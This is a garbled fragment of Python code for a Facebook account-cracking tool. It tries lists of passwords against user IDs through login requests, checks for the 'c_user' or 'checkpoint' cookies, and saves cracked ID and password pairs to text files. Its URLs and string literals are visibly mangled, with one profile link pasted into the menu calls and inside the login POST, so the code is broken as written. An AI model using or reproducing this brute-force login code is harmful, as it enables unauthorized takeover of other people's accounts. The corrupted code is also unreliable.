...
def Herry():
    ...
    if Herryx =='5':
        exit()
    if Herryx =='3':
        os.system(' 'https://www.facebook.com/profile.php?id=100086270594350)
    if Herryx =='4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100086270594350');Herry()
    if Herryx =='2':
        bangla()
    else:
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            free_fb = session.get('https://www.facebook.com/profile.php?id=100086270594350').text
            log_data = {
    ...
    'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://www.facebook.com/profile.php?id=100086270594350');Herry()/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[kallan-OK] '+cid+'|'+ps+'\033[0;97m')
                open('kallan-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[kallan-CP] '+cid+' | '+ps+'\x1b[1;97m')
                open('kallan-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97m kallan mitro \033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
